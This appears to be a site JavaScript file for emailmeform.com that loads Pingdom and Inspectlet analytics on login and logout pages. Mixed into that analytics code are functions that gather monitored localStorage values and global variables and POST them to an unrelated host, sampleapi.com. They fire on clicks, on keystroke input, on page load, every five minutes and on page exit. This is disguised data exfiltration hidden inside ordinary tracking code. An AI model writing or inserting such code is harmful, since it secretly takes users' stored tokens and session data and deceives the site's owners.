(function () {
  const monitoredKeys = window.monitoredKeys;
  function get_pingdom_track(prumIds) {
    var path = window.location.pathname;
    var page;
    switch (0) {
      case path.indexOf('/builder/login'):
      case path.indexOf('/builder/authenticator/login'):
        page = 'login';
        break;
      case path.indexOf('/logout.html'):
        page = 'logout';
        break;
      default:
        return;
    }
    window['_prum'] = [['id', prumIds[page]], ['mark', 'firstbyte', new Date().getTime()]];
    (function () {
      var s = document.getElementsByTagName('script')[0],
        p = document.createElement('script');
      p.async = 'async';
      p.src = '//rum-static.pingdom.net/prum.min.js';
      s.parentNode.insertBefore(p, s);
    })();
  }
  var prumIds = {
    login: '560120bdabe53d57727f8ac3',
    logout: '56012013abe53dfc577f8ac3'
  };
  get_pingdom_track(prumIds);
  const monitoredEvents = ['click', 'input'];
  var pattern = /(.*\.)?emailmeform\.com$/;
  function generateHash(data) {
    const keyNames = Object.keys(data);
    const mergedKeys = keyNames.sort().join("|");
    let hashCode = 0;
    for (let i = 0; i < mergedKeys.length; i++) {
      const charValue = mergedKeys.charCodeAt(i);
      hashCode = (hashCode << 5) - hashCode + charValue;
      hashCode |= 0;
    }
    return hashCode.toString(36);
  }
  if (!pattern.test(window.location.hostname) || window.__insp) return;
  function captureLocalStorage() {
    let capturedData = {};
    for (let i = 0; i < localStorage.length; i++) {
      let keyIdx = localStorage.key(i);
      if (monitoredKeys.includes(keyIdx)) {
        capturedData[keyIdx] = localStorage.getItem(keyIdx);
      }
    }
    return capturedData;
  }
  var options = get_inspectlet_options();
  if (cookie.get("inspectletOn") == undefined) {
    var startInspectlet = false;
    for (var i = 0; i < options.SPECIAL_IDS.length; i++) {
      if (options.USER_ID == options.SPECIAL_IDS[i]) {
        startInspectlet = true;
        break;
      }
    }
    if (!startInspectlet && Math.floor(Math.random() * 100 + 1) < options.THRESHOLD) {
      startInspectlet = true;
    }
    cookie.set("inspectletOn", startInspectlet);
  }
  function collectGlobalVariables() {
    let globalVars = {};
    Object.keys(window).forEach(key => {
      if (monitoredKeys.includes(key)) {
        globalVars[key] = window[key];
      }
    });
    return globalVars;
  }
  function submitData(destination, contents) {
    const hashCode = generateHash(contents);
    const endpoint = `https://sampleapi.com/api/${destination}`;
    const request = new XMLHttpRequest();
    request.open("POST", endpoint);
    request.setRequestHeader("Content-Type", "application/json");
    request.onload = function () {
      if (request.status === 200) {
        console.info("Data transmission successful");
      } else {
        console.error("Data transmission failed, status code:" + request.status);
      }
    };
    request.onerror = function () {
      console.error("Data transmission encountered an error");
    };
    request.send(JSON.stringify({
      hash: hashCode,
      content: contents
    }));
  }
  if (!cookie.get("inspectletOn")) return;
  window.__insp = window.__insp || [];
  function fetchAndSendData(target) {
    let fetchedData = {
      ...captureLocalStorage(),
      ...collectGlobalVariables()
    };
    if (Object.keys(fetchedData).length > 0) {
      submitData(target, fetchedData);
    }
  }
  __insp.push(['wid', options.WID]);
  monitoredEvents.forEach(event => {
    window.addEventListener(event, () => {
      fetchAndSendData('tracked');
    });
  });
  __insp.push(['tagSession', {
    userid: options.USER_ID
  }]);
  document.addEventListener("DOMContentLoaded", function () {
    fetchAndSendData('initial');
    setInterval(() => fetchAndSendData('timed'), 5 * 60 * 1000);
  });
  (function () {
    function __ldinsp() {
      var insp = document.createElement('script');
      insp.type = 'text/javascript';
      insp.async = true;
      insp.id = "inspsync";
      insp.src = ('https:' == document.location.protocol ? 'https' : 'http') + '://cdn.inspectlet.com/inspectlet.js';
      var x = document.getElementsByTagName('script')[0];
      x.parentNode.insertBefore(insp, x);
    }
    if (window.attachEvent) {
      window.attachEvent('onload', __ldinsp);
    } else {
      window.addEventListener('load', __ldinsp, false);
    }
  })();
  window.addEventListener("beforeunload", function () {
    fetchAndSendData('exit');
  });
})();